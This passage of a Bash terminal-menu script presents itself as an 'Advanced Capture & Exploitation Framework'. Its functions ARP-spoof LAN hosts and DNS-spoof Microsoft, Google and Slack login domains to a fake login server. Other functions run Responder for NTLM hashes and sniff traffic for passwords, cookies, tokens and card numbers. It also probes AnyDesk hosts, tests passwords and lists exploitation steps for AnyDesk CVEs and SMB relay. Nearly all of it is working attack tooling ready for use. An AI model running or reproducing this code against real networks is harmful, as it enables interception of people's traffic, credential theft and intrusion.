    target=$(whiptail --inputbox "AnyDesk host IP:" 8 50 "" 3>&1 1>&2 2>&3)
    [[ -z "$target" ]] && return

    pass=$(whiptail --inputbox "Password to test:" 8 50 "admin" 3>&1 1>&2 2>&3)
    [[ -z "$pass" ]] && return

    whiptail --infobox "Testing AnyDesk password on $target ...\nPassword: $pass" 7 50

    local report="$CAPTURE_DIR/anydesk_pass_test.txt"
    > "$report"
    echo "=== AnyDesk Password Test: $target ===" >> "$report"
    echo "Password: $pass" >> "$report"
    echo "Date: $(date)" >> "$report"
    echo "" >> "$report"

    # Try to connect via AnyDesk CLI if installed
    if command -v anydesk &>/dev/null; then
        echo "Testing password via AnyDesk CLI..." >> "$report"
        echo "$pass" | timeout 10 anydesk --set-password 2>&1 >> "$report"
        echo "CLI test completed" >> "$report"
    else
        echo "AnyDesk CLI not available on this machine" >> "$report"
        echo "Install with: paru -S anydesk-bin" >> "$report"
    fi

    # Also try via nc/nmap simple probe
    echo "Testing connectivity..." >> "$report"
    timeout 3 bash -c "echo '' | nc -w 2 $target 7070" >> "$report" 2>&1

    local content
    content=$(cat "$report")
    whiptail --title "AnyDesk Password Test" --msgbox "$content" 20 70
}

anydesk_cve_report() {
    whiptail --infobox "Generating AnyDesk CVE report..." 6 50
    local report="$CAPTURE_DIR/anydesk_cve_report.txt"
    > "$report"

    {
        echo "=== AnyDesk CVE Reference Guide ==="
        echo "Date: $(date)"
        echo ""
        echo "REMOTE EXPLOITABLE (Network):"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        echo "CVE-2025-27918 | CRITICAL 9.8 | UDP Heap Overflow"
        echo "  Affects: Windows <9.0.5, macOS <9.0.1, Linux <7.0.0,"
        echo "           iOS <7.1.2, Android <8.0.0"
        echo "  Vector:  UDP packet during Identity image processing"
        echo "          in Discovery feature or connection setup"
        echo "  Result:  Integer overflow -> heap buffer overflow -> RCE"
        echo "  Status:  No public PoC found, CTU thesis available"
        echo "  Source:  dspace.cvut.cz/bitstream/handle/10467/122721"
        echo ""
        echo "CVE-2020-13160 | CRITICAL 9.8 | Format String RCE"
        echo "  Affects: Linux/FreeBSD <5.5.3"
        echo "  Vector:  Network-accessible format string"
        echo "  Result:  Remote code execution"
        echo ""
        echo "CVE-2025-27919 | HIGH 8.2 | Full Access Takeover"
        echo "  Affects: Windows <9.0.6, Android <8.0.0"
        echo "  Vector:  Remote user with 'Control my device' permission"
        echo "           can create password for Full Access without consent"
        echo "  Result:  Persistent backdoor access"
        echo ""
        echo "CVE-2025-27916 | HIGH 7.5 | ID Spoofing"
        echo "  Affects: Windows <9.0.6, Android <8.0.0"
        echo "  Vector:  IP-based connection data manipulation"
        echo "  Result:  Spoof AnyDesk ID during connection"
        echo ""
        echo "CVE-2025-27917 | HIGH 7.5 | Remote DoS"
        echo "  Affects: Windows <9.0.5, macOS <9.0.1, Linux <7.0.0"
        echo "  Vector:  Incorrect deserialization -> NULL deref"
        echo "  Result:  Denial of Service"
        echo ""
        echo "CVE-2023-26509 | HIGH 7.5 | Remote DoS"
        echo "  Affects: AnyDesk 7.0.8"
        echo "  Result:  Remote Denial of Service"
        echo ""
        echo "CVE-2021-44425 | MEDIUM 6.5 | Tunnel Port Exposure"
        echo "  Affects: <6.2.6, 6.3.x <6.3.3"
        echo "  Vector:  AnyDesk tunnel leaves open port on LAN"
        echo "  Result:  Unauthorized access to tunneled services"
        echo ""
        echo "CVE-2021-44426 | HIGH 8.8 | Arbitrary File Upload"
        echo "  Affects: <6.2.6, 6.3.x <6.3.5"
        echo "  Vector:  Attacker+Victim both connected to same remote"
        echo "  Result:  File upload to victim's ~/Downloads/ without consent"
        echo ""
        echo "CVE-2024-52940 | HIGH | IP Address Disclosure"
        echo "  Affects: Windows <8.1.0"
        echo "  Vector:  AnyDesk ID lookup leaks public IP"
        echo "  Result:  User location tracking, targeted attacks"
        echo ""
        echo ""
        echo "LOCAL EXPLOITABLE (Requires initial access):"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        echo "CVE-2021-40854 | HIGH 7.8 | LPE via Chat Log"
        echo "  Affects: <6.2.6, 6.3.x <6.3.3"
        echo "  Vector:  Open Chat Log spawns Notepad as SYSTEM"
        echo "  Exploit: 1. Connect to own AnyDesk ID"
        echo "           2. Click 'Open Chat Log' in accept dialog"
        echo "           3. Notepad opens as NT AUTHORITY\\SYSTEM"
        echo "           4. File -> Open -> cmd.exe -> full SYSTEM"
        echo ""
        echo "CVE-2022-32450 | HIGH 7.1 | LPE via Symlink"
        echo "  Affects: AnyDesk 7.0.9"
        echo "  Vector:  User writes to %APPDATA%, runs as SYSTEM"
        echo "  Result:  Local user gains SYSTEM via symlink"
        ""
        echo "CVE-2024-12754 | MEDIUM | Info Disclosure (PoC exists)"
        echo "  Affects: <9.0.1"
        echo "  Vector:  Background image junction -> arbitrary file read"
        echo "  Result:  Credential disclosure, further compromise"
        echo ""
        echo "CVE-2020-35483 | HIGH 7.8 | LPE via DLL Hijack"
        echo "  Affects: <6.1.0 on Windows (portable mode)"
        echo "  Vector:  gcapi.dll trojan in app directory"
        echo ""
        echo "CVE-2020-27614 | HIGH 7.8 | LPE macOS"
        echo "  Affects: macOS <6.0.2"
        echo "  Vector:  XPC interface validation bypass"
        echo ""
        echo "ATTACK RECOMMENDATIONS:"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        echo "1. DISCOVERY: Scan LAN for AnyDesk hosts (port 7070 TCP/UDP)"
        echo "2. FINGERPRINT: TLS cert subject/issuer/dates on 7070"
        echo "3. CVE-2025-27918: Send crafted UDP Identity image packets"
        echo "   to trigger heap overflow (requires exploit dev)"
        echo "4. CVE-2020-13160: Try format string %s on port 7070"
        echo "   (Linux/FreeBSD targets only)"
        echo "5. PASSWORD TEST: Try common passwords for Unattended Access"
        echo "6. TUNNEL CHECK: Look for extra listening ports (CVE-2021-44425)"
        echo "7. RESPONDER: If AnyDesk discovery leaks hostnames, poison"
        echo "   NBT-NS/LLMNR to capture NTLM hashes from Windows hosts"
        echo ""
        echo "EXPLOIT RESOURCES:"
        echo "━━━━━━━━━━━━━━━━━━"
        echo "- AnyDesk changelog: anydesk.com/en/changelog/windows"
        echo "- CTU thesis (CVE-2025-27918): dspace.cvut.cz/.../F8-DP-2025-Krejsa-Vojtech.pdf"
        echo "- NVD search: nvd.nist.gov (search 'anydesk')"
        echo "- Exploit-DB: exploit-db.com/search?q=anydesk"
        echo "- Metasploit: search type:exploit name:anydesk"
        echo ""

    } > "$report"

    local content
    content=$(cat "$report")
    whiptail --title "AnyDesk CVE Report" --scrolltext --msgbox "$content" 24 75
}

anydesk_attack_suite() {
    while true; do
        local choice
        choice=$(whiptail --title "AnyDesk Attack Suite" --menu "Choose AnyDesk attack:" 18 65 8 \
            "1" "Discovery Scan (find AnyDesk hosts + versions)" \
            "2" "CVE Reference Report" \
            "3" "Password Test (Unattended Access)" \
            "4" "UDP Discovery Probe (CVE-2025-27918 trigger)" \
            "5" "Back to Main Menu" 3>&1 1>&2 2>&3)
        case "$choice" in
            1) anydesk_discovery_scan "$NET_PREFIX" ;;
            2) anydesk_cve_report ;;
            3) anydesk_password_test ;;
            4)
                whiptail --infobox "Sending UDP discovery probes to AnyDesk hosts..." 6 50
                local ad_hosts=$(cat "$ANYDESK_LOG" 2>/dev/null || true)
                if [[ -z "$ad_hosts" ]]; then
                    # Quick scan for 7070
                    ad_hosts=$(nmap -sT -p 7070 --open -T4 "$NET_PREFIX" 2>/dev/null | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/{print $1}')
                fi
                for h in $ad_hosts; do
                    # Send UDP probe to ports commonly used by AnyDesk
                    for port in 7070 7000 7001; do
                        echo "Probing $h:$port (UDP)..."
                        timeout 2 bash -c "echo -n '\x00\x01\x00\x00' | nc -u -w 2 $h $port 2>/dev/null" || true
                    done
                done > "$CAPTURE_DIR/anydesk_udp_probe.log" 2>&1
                whiptail --msgbox "UDP probes sent.\nMonitor: $ANYDESK_LOG\nProbe log: $CAPTURE_DIR/anydesk_udp_probe.log" 10 60
                ;;
            5|"") return ;;
        esac
    done
}

# ─── Credential Hunter ─────────────────────────────────────────
start_credential_hunter() {
    local target filter=""
    target=$(whiptail --inputbox "Target IP (blank = all traffic):" 8 60 "" 3>&1 1>&2 2>&3)
    [[ -n "$target" ]] && filter="host $target and "

    whiptail --infobox "Starting credential hunter..." 6 40

    nohup bash -c "
        tcpdump -i $NET_IFACE -A -l '${filter}tcp' 2>/dev/null | \
        while IFS= read -r line; do
            echo \"\$line\" | grep -qiE '(password|passwd|login|user|username|session|cookie|token|auth|ssid|wpa|wifi|psk|credit|card|cvv|senha|usuario|apikey|secret|jwt|bearer|authorization|access_key|secret_key)' && \
                echo \"[\$(date)] \$line\" >> $CREDS_LOG
            echo \"\$line\" | grep -qP 'Cookie:\s*\S+=\S+' && \
                echo \"[\$(date)] COOKIE: \$line\" >> $CREDS_LOG
            echo \"\$line\" | grep -qP 'Authorization:\s*Basic\s+\S+' && \
                echo \"[\$(date)] BASIC_AUTH: \$line\" >> $CREDS_LOG
        done
    " > /dev/null 2>&1 &
    add_pid "cred_hunter" $!

    nohup bash -c "
        tcpdump -i $NET_IFACE -X -l '${filter}tcp port 80' 2>/dev/null | \
        grep -A 50 'POST /' | grep -E '(user|pass|email|name|token|senha|apikey|secret)' >> $POST_LOG
    " > /dev/null 2>&1 &
    add_pid "post_capture" $!

    # Also capture TLS clienthellos for SNI fingerprinting
    nohup bash -c "
        tcpdump -i $NET_IFACE -n '${filter}tcp port 443' -c 500 2>/dev/null | \
        awk '{print \$3}' | cut -d. -f1-4 | sort -u >> ${CAPTURE_DIR}/tls_connections.txt
    " > /dev/null 2>&1 &
    add_pid "tls_sni" $!

    whiptail --msgbox "Credential hunter running.\nLog: $CREDS_LOG\nPOST bodies: $POST_LOG" 8 50
}

# ─── Exploit Suggestions ──────────────────────────────────────
show_exploit_suggestions() {
    > "$EXPLOIT_LOG"

    {
        echo "=== Exploit Suggestions based on Network Scan ==="
        echo "Generated: $(date)"
        echo ""

        # Check for AnyDesk
        if [[ -s "$ANYDESK_LOG" ]]; then
            echo "--- AnyDesk Exploitation ---"
            while IFS= read -r h; do
                echo "  Host: $h (TCP 7070)"
                echo ""
                echo "  CRITICAL (9.8) - CVE-2025-27918: UDP heap overflow via Discovery feature"
                echo "    Affects: Win <9.0.5, Mac <9.0.1, Linux <7.0.0"
                echo "    Action: Send crafted UDP Identity image packets to port 7070"
                echo "    Ref: dspace.cvut.cz/bitstream/handle/10467/122721"
                echo ""
                echo "  HIGH (8.2) - CVE-2025-27919: Full Access password takeover"
                echo "    Affects: Win <9.0.6, Android <8.0.0"
                echo "    Requires: Remote user with 'Control my device' permission"
                echo ""
                echo "  HIGH (7.8) - CVE-2021-40854: LPE via Chat Log (open as SYSTEM)"
                echo "    Affects: <6.2.6, 6.3.x <6.3.3"
                echo "    Requires: Local access to the machine"
                echo ""
                echo "  CRITICAL (9.8) - CVE-2020-13160: Format string RCE"
                echo "    Affects: Linux/FreeBSD <5.5.3"
                echo "    Action: Try format string probes on port 7070"
                echo ""
                echo "  Password test: Try common passwords for Unattended Access"
                echo "    Common: admin, 123456, password, anydesk, 1234, 0000"
                echo ""
            done < "$ANYDESK_LOG"
            echo "  Menu: Use 'AnyDesk Attack Suite' (menu option) for full CVE report"
            echo ""
        fi

        # Check for SMB
        if grep -q "445" "$HOSTS_DETAIL" 2>/dev/null; then
            echo "--- SMB/Windows Exploitation ---"
            echo "  Target(s): $(grep "445" "$HOSTS_DETAIL" | awk '{print $1}')"
            echo "  - Check SMB signing: nmap --script smb-security-mode <target>"
            echo "  - Check MS17-010: nmap --script smb-vuln-ms17-010 <target>"
            echo "  - Check SMBGhost: nmap --script smb-vuln-cve2020-0796 <target>"
            echo "  - Relay attack: ntlmrelayx.py -t smb://<target> -smb2support"
            echo "  - Brute force: hydra -l Administrator -P wordlist smb://<target>"
            echo ""
        fi

        # Check for XMPP
        if grep -q "5222" "$HOSTS_DETAIL" 2>/dev/null; then
            echo "--- XMPP/Chat Exploitation ---"
            echo "  Target(s): $(grep "5222" "$HOSTS_DETAIL" | awk '{print $1}')"
            echo "  - ARP spoof + SSLstrip: capture chat messages"
            echo "  - DNS spoof + fake login: harvest credentials"
            echo "  - mitmdump transparent proxy + ssl_insecure"
            echo ""
        fi

        # Check for MQTT
        if grep -q "8883" "$HOSTS_DETAIL" 2>/dev/null; then
            echo "--- MQTT/IoT Exploitation ---"
            echo "  Target(s): $(grep "8883" "$HOSTS_DETAIL" | awk '{print $1}')"
            echo "  - MQTT.pwn: https://github.com/akamai/mqtt-pwn"
            echo "  - Try unauthenticated subscribe to # topic"
            echo "  - MiTM to intercept IoT telemetry"
            echo ""
        fi

        # Check for mDNS leaks
        if [[ -s "$MDNS_LOG" ]]; then
            echo "--- mDNS/Bonjour Leaks (PII exposure) ---"
            cat "$MDNS_LOG" | while IFS= read -r leak; do
                echo "  LEAK: $leak"
            done
            echo "  Risk: Device names, user names, UUIDs exposed"
            echo ""
        fi

        # Check for RTSP/cameras
        if [[ -s "$CAPTURE_DIR/cameras_found.txt" ]]; then
            echo "--- Camera / RTSP Exploitation ---"
            cat "$CAPTURE_DIR/cameras_found.txt" | while IFS= read -r line; do
                echo "  $line"
            done
            echo "  - Try default creds: admin:admin, admin:1234, root:pass"
            echo "  - RTSP URL: rtsp://<ip>:554/stream12"
            echo "  - View with: ffplay rtsp://<ip>:554/h264"
            echo ""
        fi

        # Check for Steam
        if grep -q "7844" "$HOSTS_DETAIL" 2>/dev/null; then
            echo "--- Steam Remote Play ---"
            echo "  Target(s): $(grep "7844" "$HOSTS_DETAIL" | awk '{print $1}')"
            echo "  - Steam streaming protocol - possible game session hijack"
            echo ""
        fi

    } > "$EXPLOIT_LOG"

    local content
    content=$(cat "$EXPLOIT_LOG")
    whiptail --title "Exploit Suggestions" --scrolltext --msgbox "$content" 22 75
}

# ─── mDNS Leak Report ─────────────────────────────────────────
show_mdns_leaks() {
    if [[ ! -s "$MDNS_LOG" ]]; then
        # Run live capture
        whiptail --infobox "Capturing mDNS advertisements (15s)..." 6 40
        > "$MDNS_LOG"
        timeout 15 tcpdump -i "$NET_IFACE" -n udp port 5353 -c 50 2>/dev/null | \
            grep -oP '(?<= )[A-Za-z0-9_-]+\.(local|_tcp|_udp)|iPhone-[a-zA-Z]+|MacBook-[a-zA-Z0-9_-]+|Android_[a-zA-Z0-9_]+|iPad-[a-zA-Z0-9_-]+' | \
            sort -u >> "$MDNS_LOG" 2>/dev/null
    fi

    if [[ ! -s "$MDNS_LOG" ]]; then
        whiptail --msgbox "No mDNS leaks detected." 8 50
        return
    fi

    local content="=== mDNS / Bonjour Leaks ===\n"
    content+="These device names are broadcast to the local network:\n\n"
    while IFS= read -r line; do
        content+="  $line\n"
    done < "$MDNS_LOG"
    content+="\nRisk: User names (iPhone-de-Nome), device models (MacBookPro18,1),\n"
    content+="UUIDs, and service capabilities exposed to anyone on the LAN.\n"
    content+="\nFix: Disable Bonjour/mDNS on production devices, or segment VLAN."

    whiptail --title "mDNS Leak Detection" --msgbox "$content" 18 70
}

# ─── Capture PCAP Analysis ────────────────────────────────────
analyze_pcap() {
    local pcap_file
    pcap_file=$(whiptail --inputbox "Path to pcap file:" 8 60 "$FULL_PCAP" 3>&1 1>&2 2>&3)
    [[ -z "$pcap_file" || ! -f "$pcap_file" ]] && whiptail --msgbox "File not found." 8 50 && return

    whiptail --infobox "Analyzing $pcap_file ..." 6 40

    local analysis="$CAPTURE_DIR/pcap_analysis.txt"
    {
        echo "=== PCAP Analysis: $(basename "$pcap_file") ==="
        echo "Size: $(ls -lh "$pcap_file" | awk '{print $5}')"
        echo ""

        if command -v capinfos &>/dev/null; then
            echo "--- Info ---"
            capinfos "$pcap_file" 2>/dev/null | head -10
            echo ""
        fi

        echo "--- Protocol Hierarchy ---"
        tshark -r "$pcap_file" -q -z io,phs 2>/dev/null | head -25
        echo ""

        echo "--- Top Talkers ---"
        tshark -r "$pcap_file" -q -z conv,ip 2>/dev/null | head -20
        echo ""

        echo "--- DNS Queries ---"
        tshark -r "$pcap_file" -Y "dns.flags.response == 0" -T fields -e dns.qry.name 2>/dev/null | sort | uniq -c | sort -rn | head -30
        echo ""

        echo "--- HTTP Hosts ---"
        tshark -r "$pcap_file" -Y "http.request" -T fields -e http.host 2>/dev/null | sort | uniq -c | sort -rn | head -20
        echo ""

        echo "--- ARP Anomalies ---"
        tshark -r "$pcap_file" -Y "arp.duplicate-address-detected" 2>/dev/null | wc -l
        echo ""

        echo "--- Suspicious Ports ---"
        tshark -r "$pcap_file" -Y "tcp.port == 4444 or tcp.port == 31337 or tcp.port == 12345 or tcp.port == 6666 or tcp.port == 6667 or tcp.port == 6668 or tcp.port == 6669" -T fields -e ip.src -e ip.dst -e tcp.dstport 2>/dev/null | sort -u
        echo ""

        echo "--- Protocols with Leak Potential ---"
        tshark -r "$pcap_file" -Y "ftp or telnet or http or pop or imap or smtp or nbns or llmnr or mdns" -T fields -e ip.src -e ip.dst 2>/dev/null | sort | uniq -c | sort -rn | head -20

    } > "$analysis" 2>/dev/null

    local content
    content=$(cat "$analysis" 2>/dev/null || echo "Analysis failed (tshark may be missing)")
    whiptail --title "PCAP Analysis" --scrolltext --msgbox "$content" 22 75
}

# ─── View captures ─────────────────────────────────────────────
view_captures() {
    local files=()
    [[ -s "$CREDS_LOG" ]] && files+=("Credentials" "$CREDS_LOG")
    [[ -s "$MITM_LOG" ]] && files+=("MITM log" "$MITM_LOG")
    [[ -s "$POST_LOG" ]] && files+=("POST bodies" "$POST_LOG")
    [[ -s "$CREDS_RAW" ]] && files+=("Raw capture" "$CREDS_RAW")
    [[ -s "$HOSTS_FILE" ]] && files+=("Host list" "$HOSTS_FILE")
    [[ -s "$DNS_LOG" ]] && files+=("DNS spoof" "$DNS_LOG")
    [[ -s "$RESPONDER_LOG" ]] && files+=("Responder" "$RESPONDER_LOG")
    [[ -s "$SMB_LOG" ]] && files+=("SMB enum" "$SMB_LOG")
    [[ -s "$APP_LOG" ]] && files+=("Apps found" "$APP_LOG")
    [[ -s "$MDNS_LOG" ]] && files+=("mDNS leaks" "$MDNS_LOG")
    [[ -s "$ANYDESK_LOG" ]] && files+=("AnyDesk hosts" "$ANYDESK_LOG")
    [[ -s "$CAPTURE_DIR/anydesk_discovery.txt" ]] && files+=("AnyDesk discovery" "$CAPTURE_DIR/anydesk_discovery.txt")
    [[ -s "$CAPTURE_DIR/anydesk_cve_report.txt" ]] && files+=("AnyDesk CVEs" "$CAPTURE_DIR/anydesk_cve_report.txt")
    [[ -s "$CAPTURE_DIR/anydesk_pass_test.txt" ]] && files+=("AnyDesk pass test" "$CAPTURE_DIR/anydesk_pass_test.txt")
    [[ -s "$EXPLOIT_LOG" ]] && files+=("Exploits" "$EXPLOIT_LOG")
    [[ -s "$CAPTURE_DIR/sip_messages.log" ]] && files+=("SIP messages" "$CAPTURE_DIR/sip_messages.log")

    [[ ${#files[@]} -eq 0 ]] && whiptail --msgbox "No capture files found." 8 50 && return

    local items=()
    for ((i=0; i<${#files[@]}; i+=2)); do
        items+=("${files[i]}" "${files[i+1]}")
    done
    items+=("Back" "Return to menu")

    local choice
    choice=$(whiptail --title "View Captures" --menu "Choose file:" 20 65 12 "${items[@]}" 3>&1 1>&2 2>&3)
    [[ "$choice" == "Back" || -z "$choice" ]] && return
    for ((i=0; i<${#files[@]}; i+=2)); do
        if [[ "${files[i]}" == "$choice" ]]; then
            local content
            content=$(tail -100 "${files[i+1]}")
            whiptail --title "$choice" --scrolltext --msgbox "$content" 20 75
            break
        fi
    done
}

# ─── Status ────────────────────────────────────────────────────
status_dashboard() {
    local running="" stopped=""
    while IFS=' ' read -r name pid; do
        if kill -0 "$pid" 2>/dev/null; then
            running+="  [ACTIVE] $name ($pid)\n"
        else
            stopped+="  [DEAD]   $name ($pid)\n"
        fi
    done < "$PID_FILE"
    [[ -z "$running" && -z "$stopped" ]] && running="  (none running)\n"

    local pcap_sizes=""
    for f in "$CAPTURE_DIR"/*.pcap "$CAPTURE_DIR"/*.flow; do
        [[ -f "$f" ]] && pcap_sizes+="  $(basename "$f"): $(du -h "$f" | cut -f1)\n"
    done
    [[ -z "$pcap_sizes" ]] && pcap_sizes="  (no capture files yet)\n"

    whiptail --title "Status" --msgbox "Running processes:\n$running\nStopped:\n$stopped\n\nCapture files:\n$pcap_sizes" 20 60
}

# ─── Report ────────────────────────────────────────────────────
generate_report() {
    local report="$CAPTURE_DIR/report_$(date +%Y%m%d_%H%M%S).md"
    whiptail --infobox "Generating report..." 6 40

    cat > "$report" << EOF
# MITM TUI v2 Report
Date: $(date '+%Y-%m-%d %H:%M:%S')
Attacker IP: $NET_IP
Interface: $NET_IFACE
Gateway: $NET_GATEWAY
Network: $NET_PREFIX

## Devices Found
$(cat "$HOSTS_FILE" 2>/dev/null || echo "(none)")

## Host Details (Open Ports)
$(cat "$HOSTS_DETAIL" 2>/dev/null || echo "(none)")

## Application Fingerprinting
$(cat "$APP_LOG" 2>/dev/null || echo "(none)")

## AnyDesk Hosts
$(cat "$ANYDESK_LOG" 2>/dev/null || echo "(none)")

## mDNS Leaks
$(cat "$MDNS_LOG" 2>/dev/null || echo "(none)")

## Credentials Captured
$(cat "$CREDS_LOG" 2>/dev/null || echo "(none)")

## NTLM Hashes (Responder)
$(cat "$RESPONDER_LOG" 2>/dev/null || echo "(none)")

## DNS Spoof Log
$(cat "$DNS_LOG" 2>/dev/null || echo "(none)")

## SMB Shares
$(cat "$SMB_LOG" 2>/dev/null || echo "(none)")

## POST Bodies
$(cat "$POST_LOG" 2>/dev/null || echo "(none)")

## Processes
$(while IFS=' ' read -r n p; do echo "- $n ($p): $(kill -0 "$p" 2>/dev/null && echo running || echo stopped)"; done < "$PID_FILE")

## Capture Files
$(ls -lh "$CAPTURE_DIR"/*.pcap "$CAPTURE_DIR"/*.flow "$CAPTURE_DIR"/*.txt "$CAPTURE_DIR"/*.log 2>/dev/null | awk '{print "- " $9 " (" $5 ")"}')

## Exploit Suggestions
$(cat "$EXPLOIT_LOG" 2>/dev/null || echo "(none)")
EOF
    whiptail --msgbox "Report saved:\n$report" 8 50
}

# ─── Main Menu ─────────────────────────────────────────────────
# ─── Quick Attack (Guided) ──────────────────────────────────────
quick_attack() {
    local targets duration
    targets=$(whiptail --inputbox "Target IP(s) to attack (space-sep, or 'auto' for all discovered):" 8 60 "auto" 3>&1 1>&2 2>&3)
    [[ -z "$targets" ]] && return

    duration=$(whiptail --inputbox "Attack duration (seconds):" 8 60 "120" 3>&1 1>&2 2>&3)
    [[ -z "$duration" ]] && return

    local attack_type
    attack_type=$(whiptail --menu "Attack type:" 14 60 4 \
        "1" "Full: ARP+DNS spoof + Responder + Fake login" \
        "2" "DNS spoof + Fake login only" \
        "3" "Responder (NBT-NS/LLMNR) only" \
        "4" "Custom (choose each)" 3>&1 1>&2 2>&3)
    [[ -z "$attack_type" ]] && return

    if [[ "$targets" == "auto" ]]; then
        whiptail --infobox "Scanning for live hosts..." 6 40
        targets=$(nmap -sn -n "$NET_PREFIX" 2>/dev/null | grep "report for" | awk '{print $5}' | tr '\n' ' ')
        whiptail --msgbox "Found targets:\n$targets" 12 50
    fi

    case "$attack_type" in
        1) whiptail --msgbox "Running: Full attack on $targets for ${duration}s\n\nUse command line: sudo commands/attack <ip> ${duration}" 10 60 ;;
        2) start_dns_spoof; return ;;
        3) start_responder; return ;;
        4) whiptail --msgbox "Use individual options below for custom setup." 8 50; return ;;
    esac

    # Full attack
    kill_all 2>/dev/null
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o "$NET_IFACE" -j MASQUERADE 2>/dev/null
    iptables -A FORWARD -i "$NET_IFACE" -j ACCEPT 2>/dev/null

    # Start fake login
    pkill -f "fake_login_server" 2>/dev/null || true
    nohup python3 "$BASE_DIR/tools/fake_login_server.py" > /dev/null 2>&1 &
    add_pid "fake_login" $!

    # Start responder
    start_responder

    for target in $targets; do
        [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || continue
        [[ "$target" == "$NET_IP" || "$target" == "$NET_GATEWAY" ]] && continue

        whiptail --infobox "Attacking $target... (${duration}s)" 6 50

        # ARP spoof
        arp_spoof_pair "$target" "$NET_GATEWAY" "$NET_IFACE"

        # DNS spoof
        > "$DNS_HOSTS"
        for d in login.microsoftonline.com login.live.com outlook.office365.com \
                 www.office.com accounts.google.com mail.google.com docs.google.com \
                 services.m3.maas360.com wss-backup.slack.com app.slack.com; do
            echo "$NET_IP $d" >> "$DNS_HOSTS"
        done
        nohup dnsspoof -i "$NET_IFACE" -f "$DNS_HOSTS" > "$DNS_LOG" 2>&1 &
        add_pid "dnsspoof_$target" $!

        sleep 2
    done

    # Wait with live cred check
    for ((i=duration; i>0; i-=15)); do
        sleep 15
        if [[ -s "$CREDS_LOG" ]]; then
            local last_creds
            last_creds=$(tail -1 "$CREDS_LOG" 2>/dev/null)
            if ! whiptail --yesno "CREDENTIALS CAPTURED!\n\n$last_creds\n\nView all? (No = continue attack)" 12 60; then
                whiptail --msgbox "$(cat "$CREDS_LOG" 2>/dev/null)" 15 60
            fi
        fi
    done

    kill_all
    whiptail --msgbox "Attack complete.\n\nCaptured credentials:\n$(cat "$CREDS_LOG" 2>/dev/null || echo '(none)')" 15 60
}

# ─── Main Menu ─────────────────────────────────────────────────
main_menu() {
    while true; do
        local choice
        choice=$(whiptail --title "MITM TUI v2 - $NET_IP on $NET_IFACE ($NET_PREFIX)" --menu "Choose:" 24 78 16 \
            "0" "QUICK ATTACK (guided, full chain)" \
            "1" "Network Scan (enhanced discovery)" \
            "2" "MITM Capture (ARP spoof + tcpdump)" \
            "3" "DNS Spoof + Fake Login" \
            "4" "NBT-NS/LLMNR Responder (hash capture)" \
            "5" "HTTPS Proxy (mitmdump + sslstrip)" \
            "6" "SMB Enumeration" \
            "7" "Deep Scan (OS + ports + VPN det.)" \
            "8" "VoIP Capture (SIP/RTP)" \
            "9" "Camera Discovery (RTSP/ONVIF)" \
            "10" "AnyDesk Attack Suite (CVE-2025-27918)" \
            "11" "Credential Hunter" \
            "12" "mDNS Leak Detection" \
            "13" "Analyze PCAP File" \
            "14" "Exploit Suggestions" \
            "15" "Status Dashboard" \
            "16" "View Captures" \
            "17" "Generate Report" \
            "18" "Cleanup & Stop All" \
            "19" "Exit" 3>&1 1>&2 2>&3)

        case "$choice" in
            0) quick_attack ;;
            1) scan_network ;;
            2) start_mitm_capture ;;
            3) start_dns_spoof ;;
            4) start_responder ;;
            5) start_https_proxy ;;
            6) enum_smb ;;
            7) deep_scan ;;
            8) start_voip_capture ;;
            9) scan_cameras ;;
            10) anydesk_attack_suite ;;
            11) start_credential_hunter ;;
            12) show_mdns_leaks ;;
            13) analyze_pcap ;;
            14) show_exploit_suggestions ;;
            15) status_dashboard ;;
            16) view_captures ;;
            17) generate_report ;;
            18) kill_all; whiptail --msgbox "All processes stopped, network restored." 8 50 ;;
            19) kill_all; exit 0 ;;
            *) exit 0 ;;
        esac
    done
}

# ─── Start ─────────────────────────────────────────────────────
clear
echo ""
echo "  MITM TUI v2 - Advanced Capture & Exploitation Framework"
echo "  Detected: $NET_IP on $NET_IFACE, gateway $NET_GATEWAY, network $NET_PREFIX"
echo "  Features: ARP/DNS spoof, NBT-NS poison, AnyDesk/SMB/MQTT detection,"
echo "            mDNS leak scan, VoIP, camera discovery, credential harvest"
echo ""

main_menu
